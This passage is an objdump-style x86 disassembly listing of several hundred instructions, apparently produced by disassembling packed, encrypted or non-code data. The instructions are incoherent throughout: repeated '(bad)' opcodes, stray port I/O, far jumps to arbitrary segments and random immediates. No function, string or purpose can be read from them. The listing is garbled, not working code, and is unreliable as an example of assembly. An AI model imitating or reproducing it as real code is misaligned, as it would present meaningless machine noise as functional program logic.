  42659c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42659d:	je     0x426605
  42659f:	pop    ss
  4265a0:	adc    eax,0xc42f7297
  4265a5:	push   ds
  4265a6:	stc    
  4265a7:	or     eax,0x414757aa
  4265ac:	nop
  4265ad:	popf   
  4265ae:	in     eax,0x5f
  4265b0:	ds xchg ebp,eax
  4265b2:	fmul   st,st(4)
  4265b4:	je     0x42654a
  4265b6:	fnsave [esi+0x28]
  4265b9:	aaa    
  4265ba:	inc    eax
  4265bb:	sub    dh,BYTE PTR [ecx]
  4265bd:	ficom  WORD PTR [esi+ecx*1-0x6b]
  4265c1:	mov    ecx,0x99440010
  4265c6:	or     al,0xf4
  4265c8:	jne    0x42657f
  4265ca:	aas    
  4265cb:	jae    0x42655e
  4265cd:	fild   DWORD PTR gs:[eax+edi*1]
  4265d1:	push   eax
  4265d2:	mov    al,0x85
  4265d4:	sub    eax,0x9521ee28
  4265d9:	lea    esi,[edx-0x3e]
  4265dc:	add    ebp,DWORD PTR [ebx+0x40]
  4265df:	in     eax,0x94
  4265e1:	sbb    BYTE PTR [edx],bl
  4265e3:	cmp    BYTE PTR [eax+ecx*1-0x71],bl
  4265e7:	repz out 0x43,eax
  4265ea:	mov    BYTE PTR [ebx-0x6a31c59c],dl
  4265f0:	mov    al,ds:0x480d7804
  4265f5:	fistp  WORD PTR [edi+0x539ddadf]
  4265fb:	shr    cl,1
  4265fd:	mov    ecx,0x49f75c59
  426602:	sub    eax,0x6ec424f4
  426607:	sub    al,0x29
  426609:	sbb    DWORD PTR [ebx+0x45],ebx
  42660c:	fst    DWORD PTR [edi-0x7f]
  42660f:	mov    ds:0xc86377c4,eax
  426614:	pop    edx
  426615:	pop    edi
  426616:	jno    0x4265b4
  426618:	call   0x74f43558
  42661d:	sub    DWORD PTR es:[ebx-0xd],ecx
  426621:	push   es
  426622:	jle    0x42664e
  426624:	inc    eax
  426625:	pop    ds
  426626:	cwde   
  426627:	aaa    
  426628:	stc    
  426629:	cmp    eax,0x8b358708
  42662e:	int    0xf5
  426630:	add    eax,0x569a361f
  426635:	sahf   
  426636:	xchg   edi,eax
  426637:	inc    ebx
  426638:	and    dh,BYTE PTR [edx-0x4bfd0348]
  42663e:	sbb    DWORD PTR [edi*8-0x5da68266],ebx
  426645:	mov    ah,BYTE PTR [edi-0x1]
  426648:	(bad)  
  426649:	test   al,0x44
  42664b:	sbb    dh,0xce
  42664e:	neg    BYTE PTR [edi]
  426650:	fimul  WORD PTR [edi+0x0]
  426653:	call   0xc6a1:0xb3d707fe
  42665a:	push   es
  42665b:	call   0xe593:0xc4b00b79
  426662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426663:	lahf   
  426664:	inc    ebx
  426665:	loope  0x42662a
  426667:	jbe    0x42661b
  426669:	sahf   
  42666a:	push   es
  42666b:	addr16 into 
  42666d:	dec    eax
  42666e:	jl     0x4265f3
  426670:	repz push ds
  426672:	cs cmc 
  426674:	test   DWORD PTR [edi+0x5da48a57],ecx
  42667a:	sbb    eax,0x9c6f1ed1
  42667f:	arpl   WORD PTR [eax-0x3e],di
  426682:	mov    bh,bh
  426684:	sub    eax,0x9173dd9e
  426689:	mov    ebp,0x9296425e
  42668e:	outs   dx,DWORD PTR ds:[esi]
  42668f:	retf   
  426690:	fild   QWORD PTR [ebx-0x2bc8aed5]
  426696:	or     ch,BYTE PTR [eax+0x39313b9c]
  42669c:	loop   0x4266dd
  42669e:	xor    eax,0x791a1dc3
  4266a3:	or     eax,0xe62021ff
  4266a8:	outs   dx,BYTE PTR ds:[esi]
  4266a9:	pop    edx
  4266aa:	call   DWORD PTR [edi-0x93fe387]
  4266b0:	jns    0x4266a4
  4266b2:	scas   eax,DWORD PTR es:[edi]
  4266b3:	(bad)  
  4266b4:	jbe    0x426670
  4266b6:	mov    esi,0xb3ed90a8
  4266bb:	cmp    BYTE PTR [edi-0x7d],ch
  4266be:	lea    edx,[esi+0x45]
  4266c1:	scas   eax,DWORD PTR es:[edi]
  4266c2:	mov    dh,0xd5
  4266c4:	fwait
  4266c5:	push   es
  4266c6:	aad    0xa
  4266c8:	lds    esi,FWORD PTR [eax+0x2f]
  4266cb:	out    0x82,al
  4266cd:	ficom  WORD PTR [edx+0x5167e5d5]
  4266d3:	scas   al,BYTE PTR es:[edi]
  4266d4:	stc    
  4266d5:	ja     0x4266c4
  4266d7:	in     eax,0x2a
  4266d9:	jmp    0x42668b
  4266db:	mov    edx,0x2c73046b
  4266e0:	mov    ds,WORD PTR [esi]
  4266e2:	cmp    al,0xc
  4266e4:	fiadd  WORD PTR [esp+edx*1-0x52f5c301]
  4266eb:	and    esp,DWORD PTR [esi-0x58]
  4266ee:	in     eax,dx
  4266ef:	mov    WORD PTR [esi-0x20101643],?
  4266f5:	call   0x7bbc8f04
  4266fa:	jp     0x426742
  4266fc:	in     al,0xf4
  4266fe:	cmp    DWORD PTR [eax+0x12],ebp
  426701:	loop   0x42675a
  426703:	(bad)  
  426704:	sub    bl,BYTE PTR [edi-0x1d]
  426707:	or     esp,edi
  426709:	pop    ebx
  42670a:	jmp    0x426748
  42670c:	daa    
  42670d:	inc    ebp
  42670e:	into   
  42670f:	and    eax,0x9581aba3
  426714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426715:	in     eax,dx
  426716:	loope  0x426734
  426718:	fcom   DWORD PTR [ecx]
  42671a:	inc    esp
  42671b:	or     al,BYTE PTR [edx+0x24]
  42671e:	add    BYTE PTR [esi-0x5bc01abb],bl
  426724:	xchg   ebp,eax
  426725:	call   DWORD PTR [ebx-0x55]
  426728:	pop    ecx
  426729:	das    
  42672a:	int3   
  42672b:	sti    
  42672c:	push   ebx
  42672d:	mov    esi,0x2aa72499
  426732:	pop    ebp
  426733:	(bad)  
  426734:	jmp    0x6e52:0x5e1e90
  42673b:	fwait
  42673c:	adc    ebp,esp
  42673e:	stc    
  42673f:	push   edx
  426740:	cmp    eax,0xa7ddefca
  426745:	adc    DWORD PTR [ebx-0x35],eax
  426748:	xor    DWORD PTR [ecx],eax
  42674a:	repnz lock in eax,dx
  42674d:	xchg   esp,eax
  42674e:	mov    bl,0x30
  426750:	daa    
  426751:	add    eax,0xff002b5d
  426756:	pop    esp
  426757:	push   ebp
  426758:	int3   
  426759:	mov    bl,ah
  42675b:	push   eax
  42675c:	(bad)  
  42675d:	rcr    al,1
  42675f:	jbe    0x4267a5
  426761:	and    edx,DWORD PTR [ebp-0x4b]
  426764:	test   ebp,ecx
  426766:	enter  0xceb9,0x80
  42676a:	or     al,0x71
  42676c:	sub    al,0xf0
  42676e:	pop    es
  42676f:	cmp    bh,bl
  426771:	and    eax,0xb0526034
  426776:	cmp    eax,0x91e0e532
  42677b:	adc    bh,BYTE PTR [edi-0x3b]
  42677e:	sub    esp,edi
  426780:	mov    al,ds:0xba702e63
  426785:	jmp    0x426712
  426787:	cmp    al,BYTE PTR [eax-0x2524baa2]
  42678d:	in     al,0xe5
  42678f:	xor    dl,BYTE PTR [eax-0x69]
  426792:	fdiv   QWORD PTR [eax]
  426794:	mov    eax,ds:0xab2f1909
  426799:	mov    cl,0xad
  42679b:	sub    esi,DWORD PTR [ebp-0x72c23164]
  4267a1:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4267a3:	add    bh,dl
  4267a5:	cs cmp al,0x3b
  4267a8:	and    BYTE PTR [eax],dh
  4267aa:	sub    BYTE PTR [ecx+0x11f5dd29],dh
  4267b0:	pop    ebp
  4267b1:	imul   eax,DWORD PTR [esi],0xab4d2a95
  4267b7:	xor    al,0x27
  4267b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267ba:	popf   
  4267bb:	fwait
  4267bc:	cld    
  4267bd:	lahf   
  4267be:	pop    edi
  4267bf:	js     0x426787
  4267c1:	jl     0x426750
  4267c3:	mov    ebx,0x61fe7a6c
  4267c8:	inc    edi
  4267c9:	pop    edi
  4267ca:	jno    0x426830
  4267cc:	mov    edi,0x9ef1dc17
  4267d1:	jle    0x426765
  4267d3:	(bad)  
  4267d4:	neg    esi
  4267d6:	dec    edx
  4267d7:	imul   edx,esi,0x6c
  4267da:	mov    eax,ds:0x4c9e70ee
  4267df:	lahf   
  4267e0:	int3   
  4267e1:	dec    edx
  4267e2:	and    ah,dh
  4267e4:	out    0x2d,al
  4267e6:	push   ebx
  4267e7:	sub    eax,0x276d7649
  4267ec:	stos   DWORD PTR es:[edi],eax
  4267ed:	xchg   ebp,eax
  4267ee:	imul   eax,edi,0x53c1c903
  4267f4:	mov    cl,ah
  4267f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4267f7:	push   ebp
  4267f8:	cmc    
  4267f9:	push   cs
  4267fa:	adc    eax,0x9f4c36c6
  4267ff:	(bad)  [edx+0x75b678a7]
  426805:	add    eax,0x88d40b72
  42680a:	pop    es
  42680b:	clc    
  42680c:	pop    eax
  42680d:	cmp    esp,DWORD PTR [ecx]
  42680f:	mov    ebp,ebp
  426811:	popa   
  426812:	mov    bh,0x16
  426814:	mov    fs,edx
  426816:	ins    DWORD PTR es:[edi],dx
  426817:	test   eax,0xea56f400
  42681c:	jnp    0x4267f0
  42681e:	sar    BYTE PTR [esi+edx*2+0x42905050],0x86
  426826:	data16 shl BYTE PTR ds:0x78a7b475,cl
  42682d:	inc    edi
  42682e:	or     al,0x8c
  426830:	jp     0x4268b0
  426832:	cs clc 
  426834:	adc    BYTE PTR [ecx+0x12],al
  426837:	fbld   TBYTE PTR [ebp+0x47]
  42683a:	imul   ebx,DWORD PTR [edx],0x8
  42683d:	cs ds mov al,0xcf
  426841:	sbb    BYTE PTR [esi],0xea
  426844:	or     BYTE PTR [eax],bl
  426846:	jl     0x426881
  426848:	mov    ebp,DWORD PTR [edi+0x56]
  42684b:	dec    eax
  42684c:	stc    
  42684d:	push   edx
  42684e:	inc    ebp
  42684f:	xchg   bl,al
  426851:	xor    DWORD PTR [eax+0x7],esp
  426854:	mov    WORD PTR [edi-0x4702acad],?
  42685a:	xor    cl,BYTE PTR [ebp+0x24]
  42685d:	xor    eax,0xddbd1528
  426862:	sub    dh,BYTE PTR [edx-0x80]
  426865:	sbb    BYTE PTR [esi],0x2b
  426868:	outs   dx,DWORD PTR ds:[esi]
  426869:	push   ebp
  42686a:	pop    eax
  42686b:	cmp    DWORD PTR [esi+0x70],ebx
  42686e:	sahf   
  42686f:	ss cli 
  426871:	outs   dx,BYTE PTR ds:[esi]
  426872:	inc    edx
  426873:	icebp  
	...
  426880:	add    cl,al
  426882:	into   
  426883:	psrld  mm1,QWORD PTR [edi]
  426886:	rcr    ebp,cl
  426888:	fistp  QWORD PTR [ebp+edi*8+0x37]
  42688c:	push   esp
  42688d:	clc    
  42688e:	mov    bh,0xe4
  426890:	scas   al,BYTE PTR es:[edi]
  426891:	int3   
  426892:	fiadd  WORD PTR [ecx]
  426894:	add    BYTE PTR [ebx+0x60000003],ch
  42689a:	ret    0x5d0c
  42689d:	std    
  42689e:	inc    ebp
  42689f:	sbb    BYTE PTR [edi+0x354a7ca0],dh
  4268a5:	fwait
  4268a6:	inc    ebp
  4268a7:	fxch   st(6)
  4268a9:	adc    al,0xad
  4268ab:	mov    ecx,0x6a01fa35
  4268b0:	lock sbb bh,bl
  4268b3:	test   al,0x1c
  4268b5:	inc    ebp
  4268b6:	xor    BYTE PTR [edx],0xb0
  4268b9:	jp     0x42691f
  4268bb:	xchg   esi,eax
  4268bc:	push   es
  4268bd:	pop    eax
  4268be:	rcr    BYTE PTR [esi-0x4accab43],0x77
  4268c5:	fdivr  DWORD PTR [edx]
  4268c7:	mov    ah,0x6
  4268c9:	sbb    ebx,ecx
  4268cb:	aam    0x7c
  4268cd:	(bad)  
  4268ce:	cmc    
  4268cf:	or     BYTE PTR [esi+0x19],dl
  4268d2:	mov    BYTE PTR [edi],cl
  4268d4:	adc    bh,BYTE PTR [ebx]
  4268d6:	repnz dec ebx
  4268d8:	mov    ?,WORD PTR [edi-0x29d1ebb]
  4268de:	jp     0x426924
  4268e0:	jo     0x42693d
  4268e2:	sar    BYTE PTR [ebx+edx*8+0xbd3da40],cl
  4268e9:	jae    0x4268be
  4268eb:	retf   0x9c78
  4268ee:	push   ebx
  4268ef:	or     edi,ebp
  4268f1:	xor    DWORD PTR [ecx],esp
  4268f3:	mov    esi,0xd29126e3
  4268f8:	or     DWORD PTR [ebx+0x376959fd],ebp
  4268fe:	(bad)  
  4268ff:	sbb    edx,DWORD PTR [esi+0x578cbdbd]
  426905:	arpl   WORD PTR [edi],bp
  426907:	mov    WORD PTR [edx],es
  426909:	fsubr  st(4),st
  42690c:	aas    
  42690d:	call   FWORD PTR [edi-0x4961d17f]
  426913:	xchg   esp,eax
  426914:	or     esi,ebp
  426916:	lds    ecx,FWORD PTR [edx+0x25]
  426919:	pop    DWORD PTR [eax-0x210d2284]
  42691f:	test   al,0x2
  426921:	mov    dl,0xe
  426923:	xor    DWORD PTR [eax],esp
  426925:	xchg   edi,eax
  426926:	out    0xb9,al
  426928:	lods   al,BYTE PTR ds:[esi]
  426929:	mov    bh,0x61
  42692b:	add    al,0x8b
  42692d:	pop    ebx
  42692e:	sbb    BYTE PTR [ecx-0x6580910c],dh
  426934:	test   DWORD PTR [ebx+edi*8],esi
  426937:	push   ebx
  426938:	lea    edx,[eax+eax*2+0x52cca042]
  42693f:	fwait
  426940:	sbb    ebx,DWORD PTR [edx]
  426942:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426943:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426944:	mov    cx,0xa66f
  426948:	or     dh,BYTE PTR [eax+0x582fcaa1]
  42694e:	popa   
  42694f:	shl    DWORD PTR [edx+0x11af1604],0xd5
  426956:	nop
  426957:	jle    0x426984
  426959:	shl    BYTE PTR [edi+0x2d4e2217],cl
  42695f:	fwait
  426960:	test   DWORD PTR [edi+0x5f],edi
  426963:	mov    ebx,0xae6cc467
  426968:	cmp    ebp,ebx
  42696a:	fwait
  42696b:	ret    
  42696c:	js     0x4269a3
  42696e:	xchg   ebp,eax
  42696f:	(bad)  [ecx]
  426971:	iret   
  426972:	ins    DWORD PTR es:[edi],dx
  426973:	or     dl,BYTE PTR [ebx-0x72247bad]
  426979:	sbb    ax,0x3614
  42697d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42697e:	jno    0x426968
  426980:	mov    dl,BYTE PTR [ebx+0x5a]
  426983:	or     esp,DWORD PTR [esi+0x36a33797]
  426989:	clc    
  42698a:	xor    DWORD PTR [esp+ebp*4],eax
  42698d:	mov    eax,ds:0x7fc27231
  426992:	mov    dl,0x98
  426994:	iret   
  426995:	loope  0x4269b9
  426997:	mov    al,ds:0xb21fa4b3
  42699c:	or     ebx,DWORD PTR [eax+0xa]
  42699f:	sub    eax,0x343d2908
  4269a4:	and    BYTE PTR [eax+edi*1],dh
  4269a7:	push   eax
  4269a8:	icebp  
  4269a9:	add    dh,BYTE PTR [edi]
  4269ab:	adc    bh,BYTE PTR [edi-0x33d704bd]
  4269b1:	sub    DWORD PTR [ebp+0x18632b6],ebp
  4269b7:	sbb    BYTE PTR [ebx-0x13],bh
  4269ba:	or     al,0x16
  4269bc:	cmp    eax,0xb7698a60
  4269c1:	mov    ebp,0x5db2b54f
  4269c6:	adc    al,0x4b
  4269c8:	add    BYTE PTR [edx+0x48],dh
  4269cb:	inc    edi
  4269cc:	nop
  4269cd:	adc    bh,BYTE PTR [ebx-0x5c]
  4269d0:	dec    esi
  4269d1:	popa   
  4269d2:	jg     0x426a02
  4269d4:	pop    DWORD PTR [ebx-0x2aca1e62]
  4269da:	mov    ecx,0x40f60331
  4269df:	push   0xffffffe1
  4269e1:	add    al,0x9f
  4269e3:	mov    bh,0xcc
  4269e5:	pop    ebx
  4269e6:	test   al,0xc6
  4269e8:	ss mov eax,0x73654d5b
  4269ee:	popa   
  4269ef:	lds    eax,FWORD PTR [ebx+edi*8]
  4269f2:	inc    ecx
  4269f3:	mov    ah,0x41
  4269f5:	push   ss
  4269f6:	or     al,cl
  4269f8:	fimul  WORD PTR [esi-0x50]
  4269fb:	xchg   esp,eax
  4269fc:	mov    edi,0x870fd13d
  426a01:	jmp    0x70747ace
  426a06:	(bad)  
  426a07:	dec    edx
  426a08:	(bad)  
  426a09:	dec    ecx
  426a0a:	jb     0x426a2f
  426a0c:	(bad)  
  426a0e:	mov    eax,ds:0x97f2ae3
  426a13:	gs jb  0x426a6c
  426a16:	mov    edx,DWORD PTR [edx+ecx*1-0x6b9b9d23]
  426a1d:	fist   WORD PTR [esi-0x57]
  426a20:	mov    cl,0xf2
  426a22:	into   
  426a23:	and    DWORD PTR [edi-0x28],ecx
  426a26:	js     0x426a07
  426a28:	gs repnz stos DWORD PTR es:[edi],eax
  426a2b:	mov    dl,0x36
  426a2d:	pop    ebp
  426a2e:	dec    edi
  426a2f:	(bad)  
  426a31:	data16 into 
  426a33:	xchg   ecx,eax
  426a34:	(bad)  
  426a35:	jmp    0xb6ff352d
  426a3a:	shr    BYTE PTR [esi+0x3e],0x63
  426a3e:	rcl    DWORD PTR [edi+0x18],cl
  426a41:	sbb    eax,0x53cdcb97
  426a46:	dec    edi
  426a47:	scas   al,BYTE PTR es:[edi]
  426a48:	mov    esp,0x699583c0
  426a4d:	and    ch,ch
  426a4f:	pop    edx
  426a50:	mov    eax,ds:0x46e2f9e3
  426a55:	lods   eax,DWORD PTR ds:[esi]
  426a56:	cmp    DWORD PTR [ecx-0x70fd8819],0xce4528b8
  426a60:	mov    eax,ds:0x8532bbe8
  426a65:	cmp    edx,DWORD PTR [edi+0x38]
  426a68:	jle    0x426a38
  426a6a:	mov    edx,0xf72dd483
  426a6f:	loope  0x426a6d
  426a71:	mov    edi,0x4f474751
  426a76:	mov    cl,0x3b
  426a78:	push   ecx
  426a79:	mov    gs,WORD PTR [edx+ebx*4+0x34]
  426a7d:	imul   ebp,DWORD PTR [ecx-0x65],0xb
  426a81:	cmp    BYTE PTR [esi],al
  426a83:	dec    ebx
  426a84:	cmp    BYTE PTR [ebp+0x66],dl
  426a87:	add    al,0x55
  426a89:	xchg   esp,eax
  426a8a:	pop    ds
  426a8b:	inc    ebp
  426a8c:	mov    eax,ds:0x6ba262c3
  426a91:	test   BYTE PTR [edx],ch
  426a93:	pop    esp
  426a94:	hlt    
  426a95:	cs mov esi,0x7ae7d9af
  426a9b:	jae    0x426aed
  426a9d:	mov    ecx,0x45f53f9a
  426aa2:	inc    esp
  426aa3:	mov    bl,0xd1
  426aa5:	inc    esp
  426aa6:	mov    eax,0xcb351215
  426aab:	jle    0x426adc
  426aad:	scas   eax,DWORD PTR es:[edi]
  426aae:	addr16 nop
  426ab0:	adc    BYTE PTR [esi-0x6819b2c3],0x6a
  426ab7:	add    BYTE PTR [edx+eiz*1-0x28e67ec2],ch
  426abe:	xchg   esi,eax
  426abf:	loope  0x426b35
  426ac1:	lods   al,BYTE PTR ds:[esi]
  426ac2:	call   DWORD PTR [edx-0x5821cff]
  426ac8:	fild   QWORD PTR [eax-0x2a]
  426acb:	cmp    esp,eax
  426acd:	inc    esp
  426ace:	mov    WORD PTR [ebx-0x63053e95],ss
  426ad4:	jge    0x426a9f
  426ad6:	(bad)  
  426ad7:	icebp  
  426ad8:	or     al,0x8a
  426ada:	iret   
  426adb:	ror    BYTE PTR [edi+esi*1-0x10],0xf8
  426ae0:	mov    ecx,DWORD PTR [esi+0x381d75d7]
  426ae6:	jl     0x426b50
  426ae8:	fsubr  DWORD PTR [edx+0x310f2ee7]
  426aee:	fisub  WORD PTR [ebx+0x7766c67e]
  426af4:	xor    al,0x22
  426af6:	fsub   st(1),st
  426af8:	pop    ebp
  426af9:	push   cs
  426afa:	mov    WORD PTR [edi+0x55],es
  426afd:	jp     0x426aa4
  426aff:	mov    ah,0x7a
  426b01:	sub    eax,0xe2130bcc
  426b06:	jmp    0x7483cd03
  426b0b:	outs   dx,DWORD PTR ds:[esi]
  426b0c:	mov    dh,0xf3
  426b0e:	jl     0x426b2b
  426b10:	out    0xb7,eax
  426b12:	inc    ecx
  426b13:	sbb    BYTE PTR [ebp-0x53cc985b],dl
  426b19:	and    BYTE PTR [esi+ebp*8],ch
  426b1c:	ins    BYTE PTR es:[edi],dx
  426b1d:	push   ss
  426b1e:	arpl   WORD PTR [edx],dx
  426b20:	xchg   esp,eax
  426b21:	clc    
  426b22:	jb     0x426ad1
  426b24:	aad    0xc
  426b26:	sub    BYTE PTR [edx+0x61],bl
  426b29:	repnz or eax,0x3283c72e
  426b2f:	push   cs
  426b30:	xchg   DWORD PTR ds:0x80a40040,edi
  426b36:	aas    
  426b37:	sahf   
  426b38:	xchg   esi,eax
  426b39:	pop    ds
  426b3a:	lds    esp,FWORD PTR [edi]
  426b3c:	adc    eax,0x647d5c5e
  426b41:	xchg   ebx,eax
  426b42:	and    DWORD PTR [edi+0x47],ecx
  426b45:	xor    ecx,DWORD PTR [esi]
  426b47:	xlat   BYTE PTR ds:[ebx]
  426b48:	ret    0xc136
  426b4b:	sbb    ebp,DWORD PTR [eax+ebx*4+0x6]
  426b4f:	in     al,0xe5
  426b51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b52:	xor    edx,DWORD PTR [ebp+0x48]
  426b55:	popf   
  426b56:	or     BYTE PTR [ebp+0x594a7217],al
  426b5c:	fnstsw WORD PTR [edx]
  426b5e:	xchg   BYTE PTR [esi-0x84947fa],dl
  426b64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b65:	int    0x9f
  426b67:	add    eax,0x19b85d8
  426b6c:	loopne 0x426b57
  426b6e:	ins    BYTE PTR es:[edi],dx
  426b6f:	fadd   DWORD PTR [edi+0xd]
  426b72:	sbb    BYTE PTR [esi+0x4c],bl
  426b75:	test   eax,0xe94fb530
  426b7a:	push   eax
  426b7b:	jg     0x426be4
  426b7d:	clc    
  426b7e:	imul   esi,DWORD PTR [ebp-0x49dcad6f],0xc
  426b85:	jne    0x426b12
  426b87:	mov    esi,DWORD PTR [ebx-0x31]
  426b8a:	or     al,0xec
  426b8c:	mov    esi,0xf960dcc2
  426b91:	lahf   
  426b92:	call   0x93f9a790
  426b97:	jnp    0x426be1
  426b99:	dec    esp
  426b9a:	sbb    dl,al
  426b9c:	push   eax
  426b9d:	icebp  
  426b9e:	out    dx,eax
  426b9f:	or     bh,BYTE PTR [ebx]
  426ba1:	ins    DWORD PTR es:[edi],dx
  426ba2:	leave  
  426ba3:	mov    dh,0x1d
  426ba5:	pusha  
  426ba6:	adc    DWORD PTR [edx-0x276c3a95],edx
  426bac:	fld    TBYTE PTR [edx+0x4f]
  426baf:	lds    sp,DWORD PTR [ebp+0x5b]
  426bb3:	bound  edx,QWORD PTR [eax-0x1e948bac]
  426bb9:	sub    BYTE PTR [ecx+eax*8],ch
  426bbc:	pop    ecx
  426bbd:	sub    BYTE PTR [eax-0x47],ch
  426bc0:	xor    edi,DWORD PTR [edx]
  426bc2:	les    ebx,FWORD PTR [edx+0x65f76dd2]
  426bc8:	inc    edi
  426bc9:	ja     0x426b95
  426bcb:	je     0x426b8a
  426bcd:	or     DWORD PTR [ebx+0x791b8fd4],ebx
  426bd3:	jg     0x426b73
  426bd5:	fisub  DWORD PTR [ebp-0x304673c5]
  426bdb:	jcxz   0x426ba8
  426bde:	jg     0x426c02
  426be0:	cmp    al,ah
  426be2:	mov    es,esi
  426be4:	inc    esi
  426be5:	in     eax,dx
  426be6:	out    0x51,al
  426be8:	dec    ecx
  426be9:	leave  
  426bea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426beb:	adc    bl,BYTE PTR [ebp-0x1932e9d8]
  426bf1:	cmp    esi,DWORD PTR [ecx+0x6a440a35]
  426bf7:	imul   ebx,DWORD PTR [edi+0x72],0x7d
  426bfb:	(bad)
  426bfe:	ins    DWORD PTR es:[edi],dx
  426bff:	test   al,0x1e
  426c01:	xchg   BYTE PTR [eax-0x53],ah
  426c04:	shr    DWORD PTR [eax-0x21],1
  426c07:	call   0xf3a86350
  426c0c:	pop    ebp
  426c0d:	call   0x4119:0x4fbd720b
  426c14:	dec    ebp
  426c15:	dec    ebx
  426c16:	das    
  426c17:	pop    es
  426c18:	or     al,0xf6
  426c1a:	pop    ss
  426c1b:	adc    DWORD PTR [ebx-0x78],esi
  426c1e:	add    DWORD PTR [esp+eax*8],ebp
  426c21:	and    al,0x24
  426c23:	adc    eax,0x7d441dd7
  426c28:	push   esp
  426c29:	mov    edx,0xb65c42fa
  426c2e:	dec    ebp
  426c2f:	sbb    edx,edx
  426c31:	rcl    DWORD PTR [ecx-0x31],1
  426c34:	enter  0x71a4,0xe3
  426c38:	mov    dl,cl
  426c3a:	sar    edx,0xcc
  426c3d:	outs   dx,DWORD PTR ds:[esi]
  426c3e:	xor    al,BYTE PTR [ecx]
  426c40:	daa    
  426c41:	jo     0x426bf9
  426c43:	xchg   ebp,eax
	...
  426c50:	add    al,dh
  426c52:	lock pusha 
  426c54:	pushf  
  426c55:	pusha  
  426c56:	pushf  
  426c57:	cld    
  426c58:	cld    
  426c59:	push   es
  426c5a:	dec    edx
  426c5b:	lock cmp edx,eax
  426c5e:	push   edx
  426c5f:	and    edi,0x1e277
  426c65:	stos   DWORD PTR es:[edi],eax
  426c66:	add    eax,DWORD PTR [eax]
  426c68:	add    ch,bh
  426c6a:	push   esp
  426c6b:	lds    edi,FWORD PTR [esi+0x11]
  426c6e:	add    edi,0xffffffdb
  426c71:	xor    al,0xc
  426c73:	or     eax,0xc0338b1e
  426c78:	int3   
  426c79:	loope  0x426ce6
  426c7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c7c:	cli    
  426c7d:	icebp  
  426c7e:	mov    edx,0x5dbef0f1
  426c83:	inc    esp
  426c84:	ret    
  426c85:	scas   al,BYTE PTR es:[edi]
  426c86:	mov    bl,0x72
  426c88:	in     eax,dx
  426c89:	xchg   esp,eax
  426c8a:	sbb    al,0x3b
  426c8c:	(bad)  
  426c8e:	aam    0x87
  426c90:	retf   
  426c91:	data16 adc BYTE PTR [ecx+0x3a],0xa3
  426c96:	push   esp
  426c97:	call   FWORD PTR [ecx+eiz*1+0x2a2935f3]
  426c9e:	lock inc esp
  426ca0:	jmp    0x35da0c3f
  426ca5:	xchg   esi,eax
  426ca6:	xchg   edi,eax
  426ca7:	mov    esi,0xcada71a7
  426cac:	nop
  426cad:	fadd   DWORD PTR [eax]
  426caf:	fmul   DWORD PTR ds:0xc5e54435
  426cb5:	ret    
  426cb6:	int3   
  426cb7:	pop    ecx
  426cb8:	or     eax,0x3194b69a
  426cbd:	jns    0x426cd4
  426cbf:	sbb    al,0xcb
  426cc1:	xchg   BYTE PTR [esi-0x1d],cl
  426cc4:	aaa    
  426cc5:	adc    dh,BYTE PTR [esi+0x26]
  426cc8:	push   ebx
  426cc9:	push   edi
  426cca:	dec    ecx
  426ccb:	mov    bh,0xc1
  426ccd:	imul   ebx,DWORD PTR [edx+esi*2],0xdaa990a2
  426cd4:	test   al,0x76
  426cd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426cd7:	mov    ah,0xb9
  426cd9:	dec    eax
  426cda:	inc    edx
  426cdb:	int    0x6
  426cdd:	adc    BYTE PTR [eax+edi*1-0x32],0x4e
  426ce2:	clc    
  426ce3:	pop    es
  426ce4:	iret   
  426ce5:	mov    eax,0x40f7902f
  426cea:	xor    al,0x51
  426cec:	sub    eax,0x7e6cb340
  426cf1:	stos   DWORD PTR es:[edi],eax
  426cf2:	mov    ah,0x73
  426cf4:	inc    esi
  426cf5:	push   ecx
  426cf6:	jb     0x426c9a
  426cf8:	dec    ebx
  426cf9:	loop   0x426c82
  426cfb:	(bad)  
  426cfc:	jmp    0xf0d4a8c4
  426d01:	popw   ss
  426d03:	sub    eax,0x7ca85b0a
  426d08:	iret   
  426d09:	repz or ebx,ebp
  426d0c:	dec    esp
  426d0d:	dec    ebp
  426d0e:	mov    BYTE PTR [esp+ecx*8+0x26c0a239],bh
  426d15:	repz jmp 0x82b1:0x2bcc5a7b
  426d1d:	sti    
  426d1e:	pusha  
  426d1f:	(bad)  
  426d20:	xor    BYTE PTR [ebp+0x4d9c0c7b],al
  426d26:	sbb    eax,ebp
  426d28:	pop    ebx
  426d29:	mov    ch,0xce
  426d2b:	xchg   ecx,edx
  426d2d:	popf   
  426d2e:	cs push eax
  426d30:	sub    eax,0x8c53a34
  426d35:	xor    cl,ch
  426d37:	and    DWORD PTR [edi],eax
  426d39:	jae    0x426cd6
  426d3b:	fdiv   QWORD PTR [esi+0x406bd124]
  426d41:	inc    edi
  426d42:	or     BYTE PTR [ebp+0x51],0x5d
  426d46:	sbb    al,0xa3
  426d48:	mov    edx,0xef1f5506
  426d4d:	push   edx
  426d4e:	(bad)  
  426d4f:	fiadd  DWORD PTR [edx]
  426d51:	(bad)  [eax]
  426d53:	add    edi,0x57
  426d56:	jbe    0x426db5
  426d58:	push   esi
  426d59:	int3   
  426d5a:	mov    bh,0x89
  426d5c:	push   ebx
  426d5d:	pop    esp
  426d5e:	xchg   ebp,eax
  426d5f:	(bad)  
  426d60:	fidiv  DWORD PTR [eax+0x5f]
  426d63:	mov    cl,0xb2
  426d65:	inc    esp
  426d66:	pop    ss
  426d67:	pop    es
  426d68:	stos   DWORD PTR es:[edi],eax
  426d69:	pusha  
  426d6a:	dec    edi
  426d6b:	sbb    eax,0x79bf4231
  426d70:	pop    edx
  426d71:	jbe    0x426cf4
  426d73:	shl    BYTE PTR [edx+0x53],cl
  426d76:	scas   al,BYTE PTR es:[edi]
  426d77:	dec    eax
